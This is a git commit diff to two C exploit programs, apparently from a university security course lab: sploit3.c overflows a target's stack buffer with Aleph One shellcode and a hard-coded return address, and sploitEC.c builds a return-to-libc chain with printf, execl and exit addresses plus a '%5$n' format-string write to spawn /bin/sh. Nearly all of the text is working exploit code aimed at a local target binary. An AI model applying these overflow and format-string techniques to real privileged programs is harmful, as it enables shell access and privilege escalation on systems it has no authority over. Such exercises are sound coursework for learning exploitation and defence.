120bca58c2a475ab76ef7ec0521e5b34416e0a0f
Adam Levin <awl44@me.com>
2019-12-02 17:04:26 -0500

    sploit3 improvement, sploitEC progress

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -11,33 +11,20 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-
-  //bfffff9c
-  char *nops = "\x90\x90\x90";
-  char *result = malloc(sizeof(nops) + 1);
-  strcat(result, nops);
-
-  char *preface1 = "rrrrrrrrrrr=\xa0\xff\xff\xbf";
+  
   char *preface = "shellcode=";
-
   char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
   strcat(envvar, preface);
-  strcat(envvar, "\x90\x90\x90\x90");
-  strcat(envvar, "\xa8\xff\xff\xbf");
+  strcat(envvar, "AAAA");
+  strcat(envvar, "\x97\xff\xff\xbf");
   strcat(envvar, shellcodeAlephOne);
 
-  char *envp[] =
-    {
-        preface1,
-        envvar
-    };
-
   args[0] = TARGET;
-  args[1] = result;
+  args[1] = "AAAAAAAAAAAAAAAA\x8f\xff\xff\xbf";
   args[2] = NULL;
   
-  // env[0] = envvar;
-  execve(TARGET, args, envp);
+  env[0] = envvar;
+  execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
   return 0;
--- sploits/sploitEC.c
+++ sploits/sploitEC.c
@@ -10,14 +10,41 @@
 int main(void)
 {
   char *args[3]; 
-  char *env[1];
-  
+  //char *env[1];
+
+  // printf 0xb7e52670
+  // RET 0x0804855b
+  // envvar1 0xbfffffa2
+  // execl 0xb7eb9a80
+  // exit 0xb7e379d0
+  // envvar2 0xbfffffb1
+  // address 0xbffffdec
+
+  char *result = malloc(41);
+  strcat(result, "AAAAAAAA");
+  strcat(result, "\x70\x26\xe5\xb7");
+  strcat(result, "\x5b\x85\x04\x08");
+  strcat(result, "\xa2\xff\xff\xbf");
+  strcat(result, "\x80\x9a\xeb\xb7");
+  strcat(result, "\xd0\x79\xe3\xb7");
+  strcat(result, "\xb1\xff\xff\xbf");
+  strcat(result, "\xb1\xff\xff\xbf");
+  strcat(result, "\xec\xfd\xff\xbf");
+
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = result; 
   args[2] = NULL;
+
+  char *envvar1 = "thing=%5$n";
+  char *envvar2 = "shellcode=/bin/sh";
   
-  env[0] = NULL;
-  execve(TARGET, args, env);
+  char *envp[] =
+    {
+        envvar1,
+        envvar2
+    };
+
+  execve(TARGET, args, envp);
   fprintf(stderr, "execve failed.\n");
 
   return 0;
